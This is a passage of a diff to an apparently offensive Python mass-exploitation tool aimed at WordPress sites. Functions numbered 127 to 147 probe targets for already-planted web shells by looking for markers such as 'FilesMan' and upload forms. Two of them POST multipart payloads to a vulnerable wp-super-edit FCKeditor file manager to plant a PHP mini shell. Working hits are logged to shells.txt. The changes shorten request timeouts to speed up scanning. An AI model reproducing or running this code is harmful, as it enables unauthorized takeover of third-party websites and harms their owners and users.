+                write_to_file('shells.txt', url + '/lock360.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/lock360.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/lock360.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 127 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/lock360.php\n')
+                    write_to_file('shells.txt', url + '/lock360.php')
             else:
                 print ('[#] Exploit 127 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2829,17 +2829,17 @@ def exploit_128(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 128 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wso.php\n')
+                write_to_file('shells.txt', url + '/wso.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 128 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wso.php\n')
+                    write_to_file('shells.txt', url + '/wso.php')
             else:
                 print ('[#] Exploit 128 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2850,17 +2850,17 @@ def exploit_129(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/for.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/for.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 129 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/for.php\n')
+                write_to_file('shells.txt', url + '/for.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/for.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/for.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 129 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/for.php\n')
+                    write_to_file('shells.txt', url + '/for.php')
             else:
                 print ('[#] Exploit 129 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2871,17 +2871,17 @@ def exploit_130(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 130 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/shell20211028.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 130 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/shell20211028.php')
             else:
                 print ('[#] Exploit 130 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2892,17 +2892,17 @@ def exploit_131(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 131 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/shell20211028.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 131 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/ws.php\n')
+                    write_to_file('shells.txt', url + '/ws.php')
             else:
                 print ('[#] Exploit 131 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2914,17 +2914,17 @@ def exploit_132(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/w3-total-cache/up.php?db',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/w3-total-cache/up.php?db',headers=headers, allow_redirects=True,timeout=5)
         if ('<input name="_upl" type="submit" id="_upl" value="Upload"></form>' in check.content.decode("utf-8")):
                 print (' [#] Exploit 132 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/w3-total-cache/up.php?db\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/w3-total-cache/up.php?db')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/w3-total-cache/up.php?db',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/w3-total-cache/up.php?db',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input name="_upl" type="submit" id="_upl" value="Upload"></form>' in check.content.decode("utf-8"):
                     print (' [#] Exploit 132 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/w3-total-cache/up.php?db\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/w3-total-cache/up.php?db')
             else:
                 print ('[#] Exploit 132 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2936,17 +2936,17 @@ def exploit_133(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/instabuilder2/cache/up.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/instabuilder2/cache/up.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input name=' in check.content.decode("utf-8")):
                 print (' [#] Exploit 133 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/instabuilder2/cache/up.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/instabuilder2/cache/up.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/instabuilder2/cache/up.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/instabuilder2/cache/up.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input name=' in check.content.decode("utf-8"):
                     print (' [#] Exploit 133 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/instabuilder2/cache/up.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/instabuilder2/cache/up.php')
             else:
                 print ('[#] Exploit 133 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2958,17 +2958,17 @@ def exploit_134(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/widgets/class-wp-widget-index.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/widgets/class-wp-widget-index.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 134 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/widgets/class-wp-widget-index.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/widgets/class-wp-widget-index.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/widgets/class-wp-widget-index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/widgets/class-wp-widget-index.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 134 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/widgets/class-wp-widget-index.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/widgets/class-wp-widget-index.php')
             else:
                 print ('[#] Exploit 134 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2980,17 +2980,17 @@ def exploit_135(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/wso.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/wso.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 135 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/wso.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/wso.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 135 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/wso.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/wso.php')
             else:
                 print ('[#] Exploit 135 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3002,17 +3002,17 @@ def exploit_136(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/uploads/ac_assets/IndoSec.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/uploads/ac_assets/IndoSec.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 136 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/uploads/ac_assets/IndoSec.php\n')
+                write_to_file('shells.txt', url + '/wp-content/uploads/ac_assets/IndoSec.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/uploads/ac_assets/IndoSec.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/uploads/ac_assets/IndoSec.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 136 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/uploads/ac_assets/IndoSec.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/uploads/ac_assets/IndoSec.php')
             else:
                 print ('[#] Exploit 136 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3024,17 +3024,17 @@ def exploit_137(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=5)
         if ('<input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">' in check.content.decode("utf-8")):
                 print (' [#] Exploit 137 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/hello.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '<input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">' in check.content.decode("utf-8"):
                     print (' [#] Exploit 137 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/hello.php')
             else:
                 print ('[#] Exploit 137 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3046,17 +3046,17 @@ def exploit_138(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Ghost Exploiter Team Official' in check.content.decode("utf-8")):
                 print (' [#] Exploit 138 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
+                write_to_file('shells.txt', url + '/wp-content/index.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Ghost Exploiter Team Official' in check.content.decode("utf-8"):
                     print (' [#] Exploit 138 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/index.php')
             else:
                 print ('[#] Exploit 138 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3068,17 +3068,17 @@ def exploit_139(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=5)
         if ('Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                 print (' [#] Exploit 139 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/index.php?BIBIL-Spamworldpro\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/index.php?BIBIL-Spamworldpro')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                     print (' [#] Exploit 139 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/index.php?BIBIL-Spamworldpro\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/index.php?BIBIL-Spamworldpro')
             else:
                 print ('[#] Exploit 139 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3090,17 +3090,17 @@ def exploit_140(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=5)
         if ('Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                 print (' [#] Exploit 140 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/index.php?BIBIL-Spamworldpro\n')
+                write_to_file('shells.txt', url + '/wp-content/index.php?BIBIL-Spamworldpro')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/index.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                     print (' [#] Exploit 140 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/index.php?BIBIL-Spamworldpro\n')
+                    write_to_file('shells.txt', url + '/wp-content/index.php?BIBIL-Spamworldpro')
             else:
                 print ('[#] Exploit 140 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3112,17 +3112,17 @@ def exploit_141(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/SpamworldSec.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/SpamworldSec.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,timeout=5)
         if ('Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                 print (' [#] Exploit 141 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/SpamworldSec.php?BIBIL-Spamworldpro\n')
+                write_to_file('shells.txt', url + '/SpamworldSec.php?BIBIL-Spamworldpro')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/SpamworldSec.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/SpamworldSec.php?BIBIL-Spamworldpro',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                     print (' [#] Exploit 141 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/SpamworldSec.php?BIBIL-Spamworldpro\n')
+                    write_to_file('shells.txt', url + '/SpamworldSec.php?BIBIL-Spamworldpro')
             else:
                 print ('[#] Exploit 141 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3133,17 +3133,17 @@ def exploit_142(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/uploads/uploads/SpamwoldSecurity.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/uploads/uploads/SpamwoldSecurity.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan Choose File    No file Choosen     Upload' in check.content.decode("utf-8")):
                 print (' [#] Exploit 142 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/uploads/uploads/SpamwoldSecurity.php\n')
+                write_to_file('shells.txt', url + '/wp-content/uploads/uploads/SpamwoldSecurity.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/uploads/uploads/SpamwoldSecurity.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/uploads/uploads/SpamwoldSecurity.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan Choose File    No file Choosen     Upload' in check.content.decode("utf-8"):
                     print (' [#] Exploit 142 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/uploads/uploads/SpamwoldSecurity.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/uploads/uploads/SpamwoldSecurity.php')
             else:
                 print ('[#] Exploit 142 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3156,17 +3156,17 @@ def exploit_143(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/Zwvyxfgt.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/Zwvyxfgt.php',headers=headers, allow_redirects=True,timeout=5)
         if ("<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8")):
                 print (' [#] Exploit 143 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/Zwvyxfgt.php\n')
+                write_to_file('shells.txt', url + '/Zwvyxfgt.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/Zwvyxfgt.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/Zwvyxfgt.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8"):
                     print (' [#] Exploit 143 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/Zwvyxfgt.php\n')
+                    write_to_file('shells.txt', url + '/Zwvyxfgt.php')
             else:
                 print ('[#] Exploit 143 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3177,17 +3177,17 @@ def exploit_144(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=5)
         if ("<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8")):
                 print (' [#] Exploit 144 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/1.php\n')
+                write_to_file('shells.txt', url + '/1.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8"):
                     print (' [#] Exploit 144 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/1.php\n')
+                    write_to_file('shells.txt', url + '/1.php')
             else:
                 print ('[#] Exploit 144 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3198,17 +3198,17 @@ def exploit_145(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ("<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8")):
                 print (' [#] Exploit 145 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/404.php\n')
+                write_to_file('shells.txt', url + '/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "<i class='bi bi-upload'></i> Upload</a>" in check.content.decode("utf-8"):
                     print (' [#] Exploit 145 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/404.php\n')
+                    write_to_file('shells.txt', url + '/404.php')
             else:
                 print ('[#] Exploit 145 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3334,11 +3334,11 @@ mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 </html>
 
 ------WebKitFormBoundaryeigShE8dZM8EnJxq--'''
-        c = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/frmupload.html',headers=headers, data=data,allow_redirects=True,verify=False ,timeout=15)
-        check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
+        c = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/frmupload.html',headers=headers, data=data,allow_redirects=True,verify=False ,timeout=5)
+        check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
         if ("mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8")):
                 print (' [#] Exploit 146 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
@@ -3455,11 +3455,11 @@ mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 </html>
 
 ------WebKitFormBoundaryeigShE8dZM8EnJxq--'''
-            c = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/frmupload.html',headers=headers, data=data,allow_redirects=True,verify=False ,timeout=15)
-            check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            c = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/frmupload.html',headers=headers, data=data,allow_redirects=True,verify=False ,timeout=5)
+            check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8"):
                     print (' [#] Exploit 146 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/h0rn3t.php')
             else:
                 print ('[#] Exploit 146 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3585,11 +3585,11 @@ mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 
 ------WebKitFormBoundaryvBB76aRVDW1qvJ4K--
 """
-        chk = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/test.html',headers=headers,data=data, allow_redirects=True,verify=False ,timeout=15)
-        check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php',headers=headers, allow_redirects=True,timeout=15)
+        chk = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/test.html',headers=headers,data=data, allow_redirects=True,verify=False ,timeout=5)
+        check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php',headers=headers, allow_redirects=True,timeout=5)
         if ("mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8")):
                 print (' [#] Exploit 147 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
@@ -3707,11 +3707,11 @@ mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 
 ------WebKitFormBoundaryvBB76aRVDW1qvJ4K--
 """
-            chk = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/test.html',headers=headers,data=data, allow_redirects=True,verify=False ,timeout=15)
-            check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            chk = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/test.html',headers=headers,data=data, allow_redirects=True,verify=False ,timeout=5)
+            check = requests.get(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8"):
                     print (' [#] Exploit 147 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/upload/x.php')
             else:
